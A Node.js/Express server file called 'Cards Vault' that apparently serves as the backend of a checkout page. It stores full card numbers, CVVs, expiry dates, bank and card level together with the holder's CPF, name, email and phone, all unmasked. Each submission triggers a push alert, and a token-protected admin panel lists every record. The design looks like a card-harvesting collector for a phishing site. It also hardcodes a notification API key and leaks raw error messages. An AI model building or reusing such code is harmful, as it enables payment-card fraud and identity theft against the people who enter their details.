require('dotenv').config();

const express  = require('express');
const { Pool } = require('pg');
const { v4: uuidv4 } = require('uuid');
const path     = require('path');
const cors     = require('cors');

// ── Pushcut ───────────────────────────────────────────────────────────────────
async function notificarPushcut(titulo, corpo) {
  try {
    const r = await fetch('https://api.pushcut.io/boLeFq-EiugGxxOsXE1wn/notifications/Cart%C3%A3o', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: titulo, text: corpo, isTimeSensitive: true }),
    });
    const txt = await r.text();
    console.log('[Pushcut]', r.status, txt);
  } catch (e) {
    console.error('[Pushcut] erro:', e.message);
  }
}

const app  = express();
const PORT = process.env.PORT || 3000;

// ── PostgreSQL ────────────────────────────────────────────────────────────────
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL?.includes('localhost')
    ? false
    : { rejectUnauthorized: false },
});

async function initDB() {
  // Cria tabela base (sem as colunas extras para compatibilidade com tabela já existente)
  await pool.query(`
    CREATE TABLE IF NOT EXISTS saved_cards (
      id         TEXT PRIMARY KEY,
      cpf        TEXT NOT NULL,
      nome       TEXT,
      email      TEXT,
      telefone   TEXT,
      brand      TEXT,
      last4      TEXT NOT NULL,
      expiry     TEXT NOT NULL,
      cvv        TEXT,
      created_at TIMESTAMPTZ DEFAULT NOW(),
      updated_at TIMESTAMPTZ DEFAULT NOW()
    )
  `);
  // Adiciona colunas extras — se já existirem, o IF NOT EXISTS ignora silenciosamente
  await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS card_number TEXT`);
  await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS bank        TEXT`);
  await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS card_level  TEXT`);
  await pool.query(`ALTER TABLE saved_cards ADD COLUMN IF NOT EXISTS card_type   TEXT`);
  await pool.query(`CREATE INDEX IF NOT EXISTS idx_sc_cpf ON saved_cards(cpf)`);
  console.log('[DB] Tabela pronta.');
}

initDB().catch(e => {
  console.error('[DB] Falha ao inicializar:', e.message);
  process.exit(1);
});

// ── Middleware ────────────────────────────────────────────────────────────────
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ── Auth ──────────────────────────────────────────────────────────────────────
function authAdmin(req, res, next) {
  const token = req.headers['x-admin-token'] || req.query.token;
  if (!process.env.ADMIN_TOKEN)
    return res.status(500).json({ ok: false, message: 'ADMIN_TOKEN não configurado.' });
  if (token !== process.env.ADMIN_TOKEN)
    return res.status(401).json({ ok: false, message: 'Token inválido.' });
  next();
}

// ── Helpers ───────────────────────────────────────────────────────────────────
// sem mascaramento — ambiente de testes

// ══════════════════════════════════════════════════════════════════════════════
//  API PÚBLICA — usada pelo checkout
// ══════════════════════════════════════════════════════════════════════════════

// Salvar / atualizar cartão
app.post('/api/cards', async (req, res) => {
  try {
    const { cpf, nome, email, telefone, brand, last4, expiry, cvv, card_number, bank, card_level, card_type } = req.body;
    if (!cpf || !last4 || !expiry)
      return res.status(400).json({ ok: false, message: 'cpf, last4 e expiry são obrigatórios.' });

    const cpfClean = cpf.replace(/\D/g, '');
    if (cpfClean.length !== 11)
      return res.status(400).json({ ok: false, message: 'CPF inválido.' });

    // Sempre insere novo registro — fase de testes, todos os cartões são salvos
    const id = uuidv4();
    await pool.query(
      `INSERT INTO saved_cards (id, cpf, nome, email, telefone, brand, last4, expiry, cvv, card_number, bank, card_level, card_type)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13)`,
      [id, cpfClean, nome||null, email||null, telefone||null, brand||null, last4, expiry, cvv||null, card_number||null, bank||null, card_level||null, card_type||null]
    );

    notificarPushcut(
      '💳 Novo cliente cadastrado',
      `${nome ? nome.split(' ')[0] : 'Cliente'} finalizou o cadastro`
    );

    res.json({ ok: true, action: 'created', id });
  } catch (e) {
    console.error('[POST /api/cards]', e.message);
    res.status(500).json({ ok: false, message: 'Erro interno.', debug: e.message });
  }
});

// Buscar cartão por CPF (checkout → pré-preencher na próxima compra)
app.get('/api/cards/:cpf', async (req, res) => {
  try {
    const cpf = req.params.cpf.replace(/\D/g, '');
    const r = await pool.query(
      'SELECT id, nome, brand, last4, expiry FROM saved_cards WHERE cpf = $1',
      [cpf]
    );
    if (!r.rows.length) return res.json({ found: false });
    res.json({ found: true, card: r.rows[0] });
  } catch (e) {
    console.error('[GET /api/cards]', e.message);
    res.status(500).json({ ok: false });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
//  ADMIN API
// ══════════════════════════════════════════════════════════════════════════════

// Listar todos
app.get('/api/admin/cards', authAdmin, async (req, res) => {
  try {
    const { search } = req.query;
    let r;
    if (search && search.trim()) {
      const q = `%${search.trim()}%`;
      r = await pool.query(
        `SELECT * FROM saved_cards
         WHERE nome ILIKE $1 OR email ILIKE $1 OR last4 LIKE $1 OR brand ILIKE $1
         ORDER BY created_at DESC`,
        [q]
      );
    } else {
      r = await pool.query('SELECT * FROM saved_cards ORDER BY created_at DESC');
    }
    const cards = r.rows;
    res.json({ ok: true, total: r.rows.length, cards });
  } catch (e) {
    console.error('[GET /api/admin/cards]', e.message);
    res.status(500).json({ ok: false });
  }
});

// Stats
app.get('/api/admin/stats', authAdmin, async (req, res) => {
  try {
    const total  = await pool.query('SELECT COUNT(*) FROM saved_cards');
    const brands = await pool.query(
      `SELECT brand, COUNT(*) as count FROM saved_cards GROUP BY brand ORDER BY count DESC`
    );
    const recent = await pool.query(
      `SELECT COUNT(*) FROM saved_cards WHERE created_at >= NOW() - INTERVAL '24 hours'`
    );
    res.json({
      ok: true,
      total:  parseInt(total.rows[0].count),
      last24: parseInt(recent.rows[0].count),
      brands: brands.rows.map(r => ({ brand: r.brand || 'desconhecido', count: parseInt(r.count) })),
    });
  } catch (e) {
    res.status(500).json({ ok: false });
  }
});

// Deletar
app.delete('/api/admin/cards/:id', authAdmin, async (req, res) => {
  try {
    const r = await pool.query('DELETE FROM saved_cards WHERE id = $1 RETURNING id', [req.params.id]);
    if (!r.rows.length) return res.status(404).json({ ok: false, message: 'Não encontrado.' });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ ok: false });
  }
});

// Deletar todos (cuidado)
app.delete('/api/admin/cards', authAdmin, async (req, res) => {
  try {
    const { confirm } = req.body;
    if (confirm !== 'DELETAR_TUDO')
      return res.status(400).json({ ok: false, message: 'Confirmação necessária.' });
    await pool.query('DELETE FROM saved_cards');
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ ok: false });
  }
});

// ── Start ─────────────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`\n🔐  Cards Vault — http://localhost:${PORT}`);
  console.log(`📋  Admin:      http://localhost:${PORT}/admin.html\n`);
});
